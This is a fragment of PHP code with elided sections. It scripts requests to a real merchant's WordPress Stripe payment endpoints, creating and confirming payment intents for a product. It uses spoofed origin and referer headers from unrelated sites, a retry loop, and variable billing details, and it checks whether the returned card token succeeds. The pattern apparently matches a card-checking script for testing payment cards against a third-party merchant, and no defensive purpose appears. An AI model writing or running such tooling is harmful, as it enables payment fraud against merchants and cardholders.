...
while ($retries < 2 && $transaction_complete == false) {
 	# code...
	$page =  cURL(
        "https://trumangroup.com/asp-payment-box/?product_id=1554",
        $headers = [
     ...
     $ajax_create_pi =  cURL(
        "https://trumangroup.com/wp-admin/admin-ajax.php",
        $headers = [
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://unitedcerebralpalsyhawaii.org',
            'referer: https://trumangroup.com/asp-payment-box/?product_id=1554',
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
        ],
            'action=asp_pp_create_pi&nonce='.$create_pi.'&amount=100&curr=USD&product_id=1554&quantity=1&billing_details={"name":"'.$fname.' '.$lname.'","email":"'.$email.'","address":{"line1":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"US","postal_code":"'.$postcode.'"}}&token=fa31909c760547663abad5b3edb32087',
        "POST",
        1,
        $cookie
...
if (strpos($token_method, '"id": "tok_') && !strpos($token_method, '"error":')) {
  ...
  echo   $ajax_confirm =  cURL(
        "https://trumangroup.com/wp-admin/admin-ajax.php",
        $headers = [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://creative27.com/?asp_action=show_pp&product_id=1554",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53"
        ],
        'action=asp_pp_confirm_pi&nonce='.$confirm.'&product_id=1554&pi_id='.$pi_id.'&token=fa31909c760547663abad5b3edb32087&opts={"payment_method_data":{"type":"card","card":{"token":"'.$token.'"},"billing_details":{"name":"'.$fname.' '.$lname.'","email":"'.$email.'"}}}',
        "POST",
        1,
        $cookie
    );
